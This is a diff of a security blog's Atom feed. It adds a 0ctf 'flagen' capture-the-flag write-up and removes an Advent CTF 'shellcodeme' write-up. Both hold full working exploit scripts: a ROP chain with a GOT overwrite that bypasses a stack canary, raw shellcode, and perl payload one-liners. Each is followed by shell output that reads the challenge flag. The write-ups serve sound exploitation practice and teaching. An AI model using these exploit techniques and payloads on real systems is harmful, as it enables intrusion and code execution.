@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Pwnable | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/pwnable/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-03-23T23:16:09+01:00</updated>
+  <updated>2015-03-30T20:15:08+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,243 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[0ctf - Flagen]]></title>
+    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-flagen/"/>
+    <updated>2015-03-30T19:32:07+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-flagen</id>
+    <content type="html"><![CDATA[<p>0ctf sported a number of challenges and I was happy to grab a few flags. Here&rsquo;s how we solved <code>flagen</code>.</p>
+
+<!-- more -->
+
+
+<p><code>flagen</code> is a 32-bit ELF, and we&rsquo;re also given the corresponding <code>libc</code> library. It functions as a flag generator, which can perform various functions on the input:</p>
+
+<pre><code>== 0ops Flag Generator ==
+1. Input Flag
+2. Uppercase
+3. Lowercase
+4. Leetify
+5. Add Prefix
+6. Output Flag
+7. Exit 
+=========================
+</code></pre>
+
+<p>We can input a fixed buffer of 256 bytes and the functions do exactly what they say. The most interesting function is <code>leetify</code>, because this takes the input and transforms it to leet-speak:</p>
+
+<pre><code>== 0ops Flag Generator ==
+1. Input Flag
+2. Uppercase
+3. Lowercase
+4. Leetify
+5. Add Prefix
+6. Output Flag
+7. Exit 
+=========================
+Your choice: 1
+Hello World!
+Done.
+== 0ops Flag Generator ==
+1. Input Flag
+2. Uppercase
+3. Lowercase
+4. Leetify
+5. Add Prefix
+6. Output Flag
+7. Exit 
+=========================
+Your choice: 4
+Done.
+== 0ops Flag Generator ==
+1. Input Flag
+2. Uppercase
+3. Lowercase
+4. Leetify
+5. Add Prefix
+6. Output Flag
+7. Exit 
+=========================
+Your choice: 6
+The Flag is: 1-13110 W0r1d!
+Done.
+</code></pre>
+
+<p>There are several transformations done, but most importantly, the <code>H</code> is translated into <code>1-1</code>. One byte becomes three bytes! I smell a buffer overflow! Indeed, when storing a flag consisting of 256 times <code>H</code> and then asking it to perform <code>leetify</code>, the program generates a segmentation fault.</p>
+
+<h2>Narrowing down</h2>
+
+<p>After disassembling the responsible function, we quickly learn that we overrun a stack buffer. By supplying the correct amount of <code>H</code> bytes, the stack buffer is extend way past the allocated 256 bytes, but the binary has stack smashing protection in place. With no way to leak the canary, it&rsquo;s time to get creative.</p>
+
+<p>The epilogue of the vulnerable function looks like this:</p>
+
+<pre><code>8048ad4: mov    eax,DWORD PTR [ebp+0x8]        ; eax is the destination buffer
+8048ad7: lea    edx,[ebp-0x10c]                ; edx is the source buffer on the stack
+8048add: mov    DWORD PTR [esp+0x4],edx        ; copy stack buffer to dest buffer
+8048ae1: mov    DWORD PTR [esp],eax
+8048ae4: call   80484f0 &lt;strcpy@plt&gt;
+8048ae9: mov    eax,DWORD PTR [ebp-0xc]
+8048aec: xor    eax,DWORD PTR gs:0x14          ; check canary value
+8048af3: je     8048afa &lt;atoi@plt+0x59a&gt;
+8048af5: call   80484e0 &lt;__stack_chk_fail@plt&gt; ; terminate if canary is overwritten
+8048afa: add    esp,0x124
+8048b00: pop    edi
+8048b01: pop    ebp
+8048b02: ret    
+</code></pre>
+
+<p>Because the function takes the pointer to the destination buffer from the stack, we can control it. This means we have a write-what-where. Unfortunately, in the process of doing this, the canary still gets destroyed!. This means that the binary will <em>always</em> call <code>stack_chk_fail</code> and terminate. Luckily, <code>stack_chk_fail</code> is an imported function, which means we can overwrite its GOT entry with the hijacked <code>strcpy</code>! This will lead to control over <code>eip</code>. Just one final hurdle&hellip;</p>
+
+<h2>ROP it likes it&rsquo;s hot</h2>
+
+<p>NX is enabled, so we need to build a ROP chain. First, we need pivot the stack pointer into our ROP chain. I found a nice <code>add esp, 0x1c; pop pop pop pop ret</code> gadget and decided to overwrite <code>stack_chk_fail</code> with that address. This will pivot <code>esp</code> into our ROP chain, ready for the next set of gadgets. The plan is to adjust the GOT pointer of <code>read</code> to make it point to <code>system</code>. Then, write out the string <code>sh;</code> in memory and using that as an argument for <code>system</code>.</p>
+
+<p>To make this happen, I just two more gadgets:</p>
+
+<pre><code class="python"># 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret
+# 0x08048aff : add [edi + 0x5d], bl; ret
+</code></pre>
+
+<p>With the first gadget, I could control the values of various registers, provided there are no bad chars. <code>0x00</code> is obviously bad, but remember, we pass the buffer to <code>leetify</code>: it will mangle chars like <code>H</code> and <code>s</code>! These must also be avoided, which is why the ROP chain builds the characters <code>s</code> and <code>h</code> in two parts in memory.</p>
+
+<p>The second gadget allows me to adjust values. Because <code>libc</code> is given, the output of <code>nm -D ./libc.so.6</code> could be grepped for <code>system</code> and <code>read</code>. By carefully choosing the numbers, I could adjust the GOT pointer for read. I decided to write out <code>sh;</code> into an empty piece of GOT memory. Finally, ret2system via <code>read@plt</code> and pop a shell!</p>
+
+<p>The final exploit:</p>
+
+<pre><code class="python">from socket import *
+import struct, telnetlib
+
+def readtil(delim):
+    buf = b''
+    while not delim in buf:
+        buf += s.recv(1)
+    return buf
+
+def sendln(b):
+    s.send(b + b'\n')
+
+def sendbin(b):
+    s.sendall(b)
+
+def p(x):
+    return struct.pack('&lt;L', x &amp; 0xffffffff)
+
+def pwn():
+    global s
+    s=socket(AF_INET, SOCK_STREAM)
+    #s.connect(('localhost', 6666))
+    s.connect(('202.112.28.115', 5149))
+
+    raw_input()
+
+    readtil('choice: ')
+    sendln('1')     # input flag
+
+    # gadgets 
+    # 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret
+    # 0x08048aff : add [edi + 0x5d], bl; ret
+
+    # start building the ropchain
+    payload = ''
+    # 0x8048d89 : used to overwrite stack_chk_fail@got and pivot the stack into our ROP chain
+    payload += p(0x8048d89) 
+    payload += '0000'*2 # junk
+
+    # from libc.6.so:
+    # 00040190 W system
+    # 000dabd0 W read
+
+    ### first byte
+    payload += p(0x08048d8c)
+    payload += p(0xffffffc0)    # ebx, lower byte is important read -&gt; system (0xd0 + 0xc0 = 0x190)
+    payload += p(-1)            # esi
+    payload += p(0x804b00c-0x5d)        # edi -&gt; read@got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    ### second byte
+    payload += p(0x08048d8c)
+    payload += p(0xffffff56)    # ebx, lower byte is important read -&gt; system (0xab + 0x56 = 0x101) 0x56 = V == not leetified
+    payload += p(-1)            # esi
+    payload += p(0x804b00d-0x5d)        # edi -&gt; read@got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    ### third byte
+    payload += p(0x08048d8c)
+    payload += p(0xfffffff7)    # ebx, lower byte is important sprintf -&gt; system (0xab + 0x56 = 0x101) 0x56 = V == not leetified
+    payload += p(-1)            # esi
+    payload += p(0x804b00e-0x5d)        # edi -&gt; read@got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+
+    ### write 'sh;' in got
+    payload += p(0x08048d8c)
+    payload += p(0xffffff39)    # ebx, 39 (0x73 would be leetified, 0x39 and 0x3a will not)
+    payload += p(-1)            # esi
+    payload += p(0x0804b1ff-0x5d)       # edi -&gt; buf in got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    payload += p(0x08048d8c)
+    payload += p(0xffffff3a)    # ebx, 3a 
+    payload += p(-1)            # esi
+    payload += p(0x0804b1ff-0x5d)       # edi -&gt; buf in got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    ### write 'sh;' in got
+    payload += p(0x08048d8c)
+    payload += p(0xffffff34)    # ebx, 68 == h
+    payload += p(-1)            # esi
+    payload += p(0x0804b200-0x5d)       # edi -&gt; buf in got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    payload += p(0x08048aff)    # 0x08048aff ; just execute the gadget twice so that 0x34 * 2 = 0x68 == 'h'
+    ### write 'sh;' in got
+    payload += p(0x08048d8c)
+    payload += p(0xffffff3b)    # ebx, 3b == ;
+    payload += p(-1)            # esi
+    payload += p(0x0804b201-0x5d)       # edi -&gt; buf in got
+    payload += p(-1)            # ebp
+    payload += p(0x08048aff)    # 0x08048aff
+    ###
+    payload += p(0x80484a0)     # read@plt -&gt; points to system()
+    payload += '1111'           # fake ret addr
+    payload += p(0x0804b1ff)    # pointer to 'sh;'
+
+    ropchain_length = len(payload)
+    adjust_with_H = ((276-len(payload))/3)
+
+    payload += 'H' * adjust_with_H  # add the correct amount of H's needed for the overflow; the pointer for strcpy() is at esp+276
+    payload += 'A' * (276-ropchain_length-adjust_with_H*3) # how many A bytes do we need to make up the buffer to exactly 276 bytes?
+    payload += p(0x804b01c) # point the strcpy to this address: stack_chk_fail@got &gt;;]
+
+    sendln(payload)
+
+    readtil('choice: ')
+    sendln('4')     # leetify
+
+    print "[+] enjoy your shell!"
+
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+
+    s.close()
+
+pwn()
+</code></pre>
+
+<pre><code>bas@tritonal:~/tmp/0ctf/flagen$ python ./exploit.py 
+
+[+] enjoy your shell!
+id
+uid=1001(flagen) gid=1001(flagen) groups=1001(flagen)
+whoami
+flagen
+cat /home/flagen/flag
+0ctf{delicious_stack_cookie_generates_flag}
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[After the Fact - BCTF Zhong Guan Cun Writeup]]></title>
@@ -1731,259 +1968,6 @@ db "/bin/sh", 0
 <p>This was a story of how a single format string vulnerability was beaten into arbitrary code execution. The exploit bypasses ASLR and NX via ROP, and finally sends over shellcode which will be executed. The CTF challenge was not designed with this in mind, but it was a fun exercise (and a potential warmup for Boston Key Party) nonetheless! My thanks go out to Mr.Un1k0d3r for being cool with me trying to break his challenge and even giving me the binary :)</p>
 
 <p>Until the next #maximumoverkill :]</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Advent CTF 2014 - Shellcodeme]]></title>
-    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/"/>
-    <updated>2014-12-24T11:37:46+01:00</updated>
-    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme</id>
-    <content type="html"><![CDATA[<p>Why o why do we take part in these painful exercises? Again, <code>shellcodeme</code> seemed like such a simple task. But looks, like all the other challenges of Advent CTF 2014, can be deceiving!</p>
-
-<!-- more -->
-
-
-<p></p>
-
-<p>We&rsquo;re given a binary and the C source code:</p>
-
-<pre><code class="c">/* gcc -m32 -fno-stack-protector -znoexecstack -o shellcodeme shellcodeme.c */
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;sys/mman.h&gt;
-
-#define SHELLCODE_LEN 1024
-
-int main(void) {
-    char *buf;
-    buf = mmap((void *)0x20000000, SHELLCODE_LEN, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-    read(0, &amp;buf, SHELLCODE_LEN);
-    mprotect((void *)0x20000000, SHELLCODE_LEN, PROT_READ); // no no no~
-    (*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
-}
-</code></pre>
-
-<p>The bug was kind of obvious:</p>
-
-<pre><code class="c">read(0, &amp;buf, SHELLCODE_LEN); // read to the location of buf itself
-</code></pre>
-
-<p>The code will read in the shellcode at <code>&amp;buf</code>, not <code>buf</code>. This will allow us to overwrite that pointer and take control of execution at this line of code:</p>
-
-<pre><code class="c">(*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
-</code></pre>
-
-<p>I chose to overwrite the <code>buf</code> pointer with <code>0x080484fc</code>, which is <code>leave; ret</code>. This will restore the stack and land us in my ROP chain. The basic idea is to re-use <code>mprotect</code> and <code>read</code> to read in the shellcode and then return to it. The following python code did just that, landing me a shell on the box:</p>
-
-<pre><code class="python">#!/usr/bin/python
-import struct
-import socket
-import telnetlib
-import time
-
-def p(x):
-        return struct.pack('&lt;L', x)
-
-POP3RET = 0x804855d
-MPROTECT = 0x8048330
-READ = 0x8048340
-
-payload = ""
-payload += p(0x080484fc)        # leave; ret (restore stack)
-payload += "A"*12               # dummy 
-
-payload += p(MPROTECT)          # mprotect shellcode area back to rwx
-payload += p(POP3RET)           # fix stack
-payload += p(0x20000000)        # addr of shellcode
-payload += p(0x1000)            # size (page-aligned)
-payload += p(0x7)               # PROT_READ|PROT_EXEC|PROT_WRITE
-
-payload += p(READ)              # read in our shellcode
-payload += p(POP3RET)           # fix stack
-payload += p(0x0)               # stdin
-payload += p(0x20000000)        # address
-payload += p(1024)              # copied value
-
-payload += p(0x20000000)        # return to shellcode
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('pwnable.katsudon.org', 33201))
-
-# send first stage
-s.send(payload)
-
-# for some reason, this delay was necessary
-time.sleep(0.05)
-
-# send shellcode, spawns /bin/sh
-s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")
-
-t = telnetlib.Telnet()
-t.sock = s
-t.interact()
-</code></pre>
-
-<p>I thought I was home-free! Let&rsquo;s cat that flag and be done with it! But what&rsquo;s this? (Yes, I&rsquo;ve started using kali! =))</p>
-
-<pre><code class="bash">root@kali:~# python exploit.py
-id
-uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
-ls -alh
-total 36K
-dr-xr-xr-x 2 root shellcodeme2 4.0K Dec 22 22:09 .
-drwxr-xr-x 3 root root         4.0K Dec 22 22:09 ..
--rw-r--r-- 1 root shellcodeme2  220 Sep 26 04:49 .bash_logout
--rw-r--r-- 1 root shellcodeme2 3.4K Sep 26 04:49 .bashrc
--rw-r--r-- 1 root shellcodeme2  675 Sep 26 04:49 .profile
--r--r----- 1 root shellcodeme2   34 Dec 22 22:09 flag
--r-xr-sr-x 1 root shellcodeme2 8.5K Dec 22 22:09 shellcodeme2
-cat flag 2&gt;&amp;1
-cat: flag: Permission denied
-</code></pre>
-
-<p>Gah! We need to exploit another binary! This one is the same C code, but compiled as x64 code&hellip; I transferred the binary over to my box and started poking it.</p>
-
-<p>The basic solution stays the same: mprotect, read, shellcode, flag. The problem with x64 is that we cannot pass the arguments to calls on the stack: that goes via registers. The two functions I needed are here:</p>
-
-<pre><code class="bash">   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
-   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
-   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
-   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
-   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
-   0x0000000000400609 &lt;+76&gt;:    mov    edx,0x1
-   0x000000000040060e &lt;+81&gt;:    mov    esi,0x400
-   0x0000000000400613 &lt;+86&gt;:    mov    edi,0x20000000
-   0x0000000000400618 &lt;+91&gt;:    call   0x4004c0 &lt;mprotect@plt&gt;
-</code></pre>
-
-<p>I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> and analyzed it to find the gadgets I&rsquo;d need. I found <code>esi/rsi</code> and <code>edi/rdi</code> quickly, but <code>edx/rdx</code> was nowhere to be found. Finally, I located these two gadgets:</p>
-
-<pre><code>0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
-0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
-</code></pre>
-
-<p>Prepare for some mind-bending ROP chains&hellip;</p>
-
-<pre><code class="python">#!/usr/bin/python
-
-import struct
-def p(x):
-    return struct.pack("L", x)
-
-payload = ""
-
-'''
-   #0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
-   #0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
-'''
-
-# first, fix up stack   
-payload += p(0x00400690)    # pop pop ret
-payload += p(0x0)
-payload += p(0x0)
-
-#### MPROTECT
-# gadgets to set edi, esi and edx and call mprotect
-payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
-payload += p(0x6)           # rbx   &lt;&lt; needs to be ebp-1 for code path!
-payload += p(0x7)           # rbp -&gt; edx = mprotect.mask
-payload += p(0x00601038-6*8)    # r12 -&gt; mprotect@got.plt
-payload += p(0x0)           # r13
-payload += p(0x400)         # r14 -&gt; rsi -&gt; esi = mprotect.len
-payload += p(0x20000000)    # r15 -&gt; rdi -&gt; edi = mprotect.addr
-
-payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
-payload += "B"*(200-144)    # spacer
-
-#### READ
-# gadgets to set edi, esi and edx and call read
-'''
-   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
-   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
-   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
-   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
-   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
-'''
-# 0x601020 &lt;read@got.plt&gt;
-payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
-payload += p(0x400-1)       # rbx   &lt;&lt; needs to be ebp-1 for code path!
-payload += p(0x400)         # rbp -&gt; edx = 0x400
-payload += p(0x601020-0x3ff*8)  # r12 -&gt; read@got.plt
-payload += p(0x0)           # r13 
-payload += p(0x20000000)    # r14 -&gt; rsi -&gt; esi = read.addr
-payload += p(0x0)           # r15 -&gt; rdi -&gt; edi = 0?
-                            # lucky for me, rax = 0
-payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
-payload += "B"*(200-144)    # spacer
-
-# return to shellcode!
-payload += p(0x20000000)
-
-print payload
-</code></pre>
-
-<p>One of the tricky things with the mprotect and read ROP chains is the following. The code at <code>0x400671</code>, which I use to set <code>edx</code>, looks like this:</p>
-
-<pre><code>   0x400671 &lt;__libc_csu_init+65&gt;:   mov    edx,ebp
-   0x400673 &lt;__libc_csu_init+67&gt;:   mov    rsi,r14
-   0x400676 &lt;__libc_csu_init+70&gt;:   mov    edi,r15d
-   0x400679 &lt;__libc_csu_init+73&gt;:   call   QWORD PTR [r12+rbx*8]
-   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
-   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp  
-   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
-   0x400686 &lt;__libc_csu_init+86&gt;:   add    rsp,0x8
-   0x40068a &lt;__libc_csu_init+90&gt;:   pop    rbx
-   0x40068b &lt;__libc_csu_init+91&gt;:   pop    rbp
-   0x40068c &lt;__libc_csu_init+92&gt;:   pop    r12
-   0x40068e &lt;__libc_csu_init+94&gt;:   pop    r13
-   0x400690 &lt;__libc_csu_init+96&gt;:   pop    r14
-   0x400692 &lt;__libc_csu_init+98&gt;:   pop    r15
-   0x400694 &lt;__libc_csu_init+100&gt;:  ret    
-</code></pre>
-
-<p>First <code>ebp</code> is copied to <code>edx</code>. Then <code>rsi</code> and <code>edi</code> are set. Then we call the QWORD pointer at a memory address referenced by <code>esi</code> and <code>ebx</code>. I chose to <code>esi</code> and <code>ebx</code> such that they point to the got pointer of mprotect.</p>
-
-<p>The problem arises after returning from the mprotect call:</p>
-
-<pre><code class="bash">   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
-   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp
-   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
-</code></pre>
-
-<p>So I needed to make sure that <code>rbx</code> and <code>rbp</code> were equal, otherwise the code jumps away and I inevitably got a crash. I solved that problem by setting <code>rbx</code> to <code>rbp-1</code>. Only thing left was to adjust <code>esi</code> and away we go! With the problem of setting <code>edx</code> out of the way, I could call mprotect to set <code>0x20000000</code> to rwx and read in the shellcode. This needed to be run from the shell that I obtained from exploiting the first binary.</p>
-
-<p>I sprinkled in some <a href="http://www.shell-storm.org/shellcode/files/shellcode-878.php">shellcode magic</a> and was able to exploit the binary locally!</p>
-
-<p>Remotely, I ran into a problem: I could not make files on the remote system, nor was python installed. I rewrote the exploit to dump the shellcode as printable bytes:</p>
-
-<pre><code class="python">shellcode = payload.encode('hex')
-
-output = ""
-
-for i in range(len(shellcode)/2):
-    output += "\\x" +shellcode[i*2:i*2+2]
-
-print output
-</code></pre>
-
-<p>I tried to run the exploit and shellcode using various combinations of echo and printf (also after spawning /bin/bash) but nothing seemed to work. It seemed the exploit didn&rsquo;t work with those two bash builtins, while it did with python. I looked for a replacement and lo and behold: perl was installed on the remote box! I rewrote the exploit to read <code>flag</code> instead of <code>/etc/passwd</code>. For this, I had to adjust the offset:</p>
-
-<pre><code>xor byte [rdi + 11], 0x41
---&gt;
-xor byte [rdi + 4], 0x41
-</code></pre>
-
-<p>And <strong>finally</strong>, starting from the first binary:</p>
-
-<pre><code class="bash">root@kali:~# python exploit.py
-id
-uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
-(perl -e 'print "\x90\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x06\x40\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x08\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x8a\x06\x40\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x28\xf0\x5f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x00\x00\x00\x20\x00\x00\x00\x00"'; perl -e 'print "\xeb\x3f\x5f\x80\x77\x04\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xffflag\x41"') | ./shellcodeme2
-ADCTF_I_l0v3_tH15_4W350M3_m15T4K
-</code></pre>
-
-<p>This one was tough, but a fun one nonetheless! ROP all the things! =)</p>
 ]]></content>
   </entry>
   
